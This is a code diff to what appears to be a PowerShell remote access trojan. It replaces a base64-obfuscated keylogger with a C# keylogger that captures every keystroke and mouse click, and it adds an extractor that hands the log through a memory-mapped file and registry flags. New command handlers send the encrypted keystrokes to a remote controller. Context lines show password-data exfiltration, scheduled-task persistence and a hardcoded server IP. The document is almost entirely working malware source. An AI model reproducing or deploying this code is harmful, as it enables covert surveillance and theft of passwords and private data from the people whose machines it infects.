@@ -586,91 +586,257 @@ class WebGather{
 	}
 }
 
-function Start-KeyLogger {
-
-    return Start-Job {
-        Add-Type -AssemblyName System.Windows.Forms
-        $listout =  New-Object System.Collections.Generic.List[string]
-        $key = [Microsoft.Win32.RegistryKey]::OpenBaseKey("CurrentUser", [Microsoft.Win32.RegistryView]::Default)
-        $subkey = $key.OpenSubKey("Environment", $true)
-        $subkey.SetValue("UserEnvironment", 0, [Microsoft.Win32.RegistryValueKind]::DWord)
-        $signatures = 'W0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXSAKcHVibGljIHN0YXRpYyBleHRlcm4gc2hvcnQgR2V0QXN5bmNLZXlTdGF0ZShpbnQgdmlydHVhbEtleUNvZGUpOyAKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldEtleWJvYXJkU3RhdGUoYnl0ZVtdIGtleXN0YXRlKTsKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE1hcFZpcnR1YWxLZXkodWludCB1Q29kZSwgaW50IHVNYXBUeXBlKTsKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFRvVW5pY29kZSh1aW50IHdWaXJ0S2V5LCB1aW50IHdTY2FuQ29kZSwgYnl0ZVtdIGxwa2V5c3RhdGUsIFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIgcHdzekJ1ZmYsIGludCBjY2hCdWZmLCB1aW50IHdGbGFncyk7Cg=='
-        $API = Add-Type -MemberDefinition ([System.Text.Encoding]::UTF8.GetString([system.convert]::FromBase64String($signatures))) -Name 'Win32' -Namespace API -PassThru
-        while ($true) {
+function Get-MMF($Name){
+    $key = [Microsoft.Win32.RegistryKey]::OpenBaseKey("CurrentUser", [Microsoft.Win32.RegistryView]::Default)
+    $subkey = $key.OpenSubKey("Environment", $true)
+    $subkey.SetValue("UserEnvironment", 12, [Microsoft.Win32.RegistryValueKind]::DWord)
+    $dataBytes = New-Object System.Collections.Generic.List[int]
+    while ($true){
+        try{
+            $mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting($Name)
+            break
+        }catch{
             Start-Sleep -Milliseconds 40
-            for ($virtualKey = 1; $virtualKey -le 254; $virtualKey++) {
-            $state = $API::GetAsyncKeyState($virtualKey)
-            if ($state -eq -32767) {
-                $LeftShift    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000)   -eq 0x8000
-                $RightShift   = ($API::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000)   -eq 0x8000
-                $LeftCtrl     = ($API::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
-                $RightCtrl    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
-                $LeftAlt      = ($API::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000)       -eq 0x8000
-                $RightAlt     = ($API::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000)       -eq 0x8000
-                $TabKey       = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000)         -eq 0x8000
-                $SpaceBar     = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000)       -eq 0x8000
-                $DeleteKey    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000)      -eq 0x8000
-                $EnterKey     = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000)      -eq 0x8000
-                $BackSpaceKey = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000)        -eq 0x8000
-                $LeftArrow    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000)        -eq 0x8000
-                $RightArrow   = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000)       -eq 0x8000
-                $UpArrow      = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000)          -eq 0x8000
-                $DownArrow    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000)        -eq 0x8000
-                $LeftMouse    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000)     -eq 0x8000
-                $RightMouse   = ($API::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000)     -eq 0x8000
-            
-                if ($LeftShift -or $RightShift) {$virkey += '[Shift]'}
-                if ($LeftCtrl  -or $RightCtrl)  {$virkey += '[Ctrl]'}
-                if ($LeftAlt   -or $RightAlt)   {$virkey += '[Alt]'}
-                if ($TabKey)       {$virkey += '[Tab]'}
-                if ($SpaceBar)     {$virkey += '[SpaceBar]'}
-                if ($DeleteKey)    {$virkey += '[Delete]'}
-                if ($EnterKey)     {$virkey += '[Enter]'}
-                if ($BackSpaceKey) {$virkey += '[Backspace]'}
-                if ($LeftArrow)    {$virkey += '[Left Arrow]'}
-                if ($RightArrow)   {$virkey += '[Right Arrow]'}
-                if ($UpArrow)      {$virkey += '[Up Arrow]'}
-                if ($DownArrow)    {$virkey += '[Down Arrow]'}
-                if ($LeftMouse)    {$virkey += '[Left Mouse]'}
-                if ($RightMouse)   {$virkey += '[Right Mouse]'}
-                if ([Console]::CapsLock) {$virkey += '[Caps Lock]'}
+        }
+    }
+    $view = $mmf.CreateViewAccessor()
+    $dataBytes = New-Object byte[] $view.Capacity
+    $view.ReadArray(0, $dataBytes, 0, $view.Capacity)
+    $view.Dispose()
+    $mmf.Dispose()
+    $subkey.SetValue("UserEnvironment", 123, [Microsoft.Win32.RegistryValueKind]::DWord)
+    return $dataBytes
+}
 
-                $virtualKeyc = $API::MapVirtualKey($virtualKey, 3)
-                $kbstate = New-Object Byte[] 256
-                $checkkbstate = $API::GetKeyboardState($kbstate)
 
-                $mychar = New-Object -TypeName System.Text.StringBuilder
-                $success = $API::ToUnicode($virtualKey, $virtualKeyc, $kbstate, $mychar, $mychar.Capacity, 0)
-                if (([System.Text.RegularExpressions.Regex]::Matches($virkey, '\[').Count) -gt 1){
-                    $listout[-1] = ''
+$script = @"
+using System;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Collections.Generic;
+using System.IO.MemoryMappedFiles;
+
+
+
+namespace Ac.KeyLogger
+{
+    public class KeyLog
+    {
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+        public static extern short GetAsyncKeyState(int virtualKeyCode);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int GetKeyboardState(byte[] keystate);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int MapVirtualKey(uint uCode, int uMapType);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+
+
+        static bool SendData(RegistryKey subkey, List<string> listout)
+        {
+            MemoryMappedFile mmf;
+            MemoryMappedViewAccessor view;
+            if ((int)subkey.GetValue("UserEnvironment") == 12)
+            {
+                string res = string.Join(",", listout);
+                byte[] result = Encoding.UTF8.GetBytes(res);
+                try
+                {
+                    mmf = MemoryMappedFile.CreateNew("MMMFFF", result.Length);
                 }
-                $listout.Add("$virkey$mychar")
-                $virkey = ''
-                if ($subkey.GetValue('UserEnvironment') -eq 12){
-                    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes(($listout | ConvertTo-Json))
-                    $mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew("MMMFFF", $dataBytes.Length)
-                    $view = $mmf.CreateViewAccessor()
-                    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
-                        $view.Write($i, $dataBytes[$i])
-                    }
-                    $view.Flush()
-                    $view.Dispose()
-                    while ($subkey.GetValue('UserEnvironment') -ne 123){
-                        Start-Sleep -Milliseconds 40
-                        Write-Host 'i m here'
-                    }
-                    for ($i=0;$i -lt 10; $i++){
-                        try{$mmf.Dispose()}catch{break}
-                    }
+                catch
+                {
+                    return false;
+                }
+                view = mmf.CreateViewAccessor();
+                view.WriteArray(0, result, 0, result.Length);
+                view.Flush();
+                view.Dispose();
+                while ((int)subkey.GetValue("UserEnvironment") != 123)
+                {
+                    Thread.Sleep(40);
+                }
+                for (int n = 0; n < 5; n++)
+                {
+                    mmf.Dispose();
+                }
+                subkey.SetValue("UserEnvironment", 0, RegistryValueKind.DWord);
+                return true;
+            }
+            return false;
+        }
 
-                    $listout =  New-Object System.Collections.Generic.List[string]
-                    $subkey.SetValue("UserEnvironment", 0, [Microsoft.Win32.RegistryValueKind]::DWord)
+        static void SatrtMain()
+        {
+            RegistryKey key;
+            RegistryKey subkey;
+            int state;
+            StringBuilder virkey = new StringBuilder();
+            List<string> listout = new List<string>();
+            KeyLog keyLog = new KeyLog();
+            key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);
+            subkey = key.OpenSubKey("Environment", true);
+
+
+            while (true)
+            {
+                Thread.Sleep(40);
+                for (int i = 0; i < 256; i++)
+                {
+                    state = GetAsyncKeyState(i);
+                    if (state == -32767)
+                    {
+                        if ((GetAsyncKeyState((int)Keys.LShiftKey) & 0x8000) == 0x8000 || (GetAsyncKeyState((int)Keys.RShiftKey) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Shift}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.LControlKey) & 0x8000) == 0x8000 || (GetAsyncKeyState((int)Keys.R) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Ctrl}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.LMenu) & 0x8000) == 0x8000 || (GetAsyncKeyState((int)Keys.RMenu) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Alt}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Tab) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Tab}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Space) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{SpaceBar}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Delete) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Delete}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Return) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Enter}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Back) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Backspace}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Left) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Left Arrow}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Right) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Right Arrow}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Up) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Up Arrow}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.Down) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Down Arrow}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.LButton) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Left Mouse}");
+                        }
+                        if ((GetAsyncKeyState((int)Keys.RButton) & 0x8000) == 0x8000)
+                        {
+                            virkey.Append("{Right Mouse}");
+                        }
+                        if (Console.CapsLock)
+                        {
+                            virkey.Append("{Caps Lock}");
+                        }
+                        StringBuilder mychar = new StringBuilder();
+                        int virtualKeyc = MapVirtualKey((uint)i, 3);
+                        byte[] kbstate = new Byte[256];
+                        int checkkbstate = GetKeyboardState(kbstate);
+                        ToUnicode((uint)i, (uint)virtualKeyc, kbstate, mychar, mychar.Capacity, 0);
+                        virkey.Append(mychar);
+                        if ((Regex.Matches(virkey.ToString(), "\\{").Count) > 1)
+                        {
+                            listout.RemoveAt(listout.Count - 1);
+                        }
+                        listout.Add(virkey.ToString());
+                        virkey.Clear();
                     }
+                }
+                if (SendData(subkey, listout))
+                {
+                    listout.Clear();
+                }
+                if (listout.Count > 1000000)
+                {
+                    listout.Clear();
                 }
             }
         }
+        public static void StartKeylog()
+        {
+            Thread newThread = new Thread(SatrtMain);
+            newThread.Start();
+        }
     }
 }
+"@
+
+
+$extractor = @"
+using System;
+using System.IO.MemoryMappedFiles;
+using Microsoft.Win32;
+
+
+namespace Ac.ExtractKeystroke
+{
+    public class Extractor
+    {
+        static byte[] GetMMF(string name, int timeoutMilliseconds)
+        {
+            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);
+            RegistryKey subkey = key.OpenSubKey("Environment", true);
+            subkey.SetValue("UserEnvironment", 12, RegistryValueKind.DWord);
+            int c = 0;
+            MemoryMappedFile mmf = null;
+            while (c < 125)
+            {
+                try
+                {
+                    mmf = MemoryMappedFile.OpenExisting(name);
+                    break;
+                }
+                catch
+                {
+                    System.Threading.Thread.Sleep(40);
+                }
+                c++;
+            }
+            if (mmf == null)
+            {
+                throw new TimeoutException("Timed out waiting for MemoryMappedFile to become available");
+            }
+            MemoryMappedViewAccessor view = mmf.CreateViewAccessor();
+            byte[] dataBytes = new byte[view.Capacity];
+            view.ReadArray(0, dataBytes, 0, (int)view.Capacity);
+            view.Dispose();
+            mmf.Dispose();
+            subkey.SetValue("UserEnvironment", 123, RegistryValueKind.DWord);
+            subkey.Close();
+            key.Close();
+            return dataBytes;
+        }
+
+        public static byte[] Extract()
+        {
+            return GetMMF("MMMFFF", 5000);
+        }
+    }
+}
+"@
+
 
 
 function Creat-NewTask($path, $argument, $Name)
@@ -690,7 +856,7 @@ function Creat-NewTask($path, $argument, $Name)
 	}
 	catch
 	{
-		{ }
+		{}
 	}
 }
 
@@ -832,6 +998,14 @@ function Start-Main
 					$WEB = ($reader -split "password")[-1].Trim()
 					$aes = [WebGather]::new().SendDataBase($WEB, $client, $encryptionKey, $randomal, $stream)
 					$randTheIv = $false
+				}
+				elseif ($reader -eq "Get keylogger") {
+					$___ = $client.send($aes.encrypt(([Ac.ExtractKeystroke.Extractor]::Extract())), $stream)
+					Write-Host "Sended"
+				}
+				elseif ($reader -eq "Start Keylogger") {
+					[Ac.KeyLogger.KeyLog]::StartKeylog()
+					$___ = $client.send($aes.encrypt(@(123,43,125,75,101,121,108,111,103,103,101,114,32,115,116,97,114,116,101,100,33)), $stream)
 				}
 				elseif ($reader.StartsWith("GetFileBytes -pin"))
 				{
@@ -1131,10 +1305,11 @@ namespace TsakAsother
 Assert-Admin
 Assert-RunOnce
 Add-Type -ReferencedAssemblies System, System.Runtime.InteropServices -TypeDefinition $Source -Language CSharp 
-Start-KeyLogger 
+Add-Type -TypeDefinition $extractor -Language CSharp
+Add-Type -TypeDefinition $script -Language CSharp -ReferencedAssemblies System.Windows.Forms.dll
 Add-Type -AssemblyName System.Security
 Set-Variable -Scope Global -Name "bultInVars" -Value ((Get-Variable).Name)
-$global:SERVIP = "192.168.137.1"
+$global:SERVIP = '192.168.137.1'
 Start-Teams
 Start-Main
 
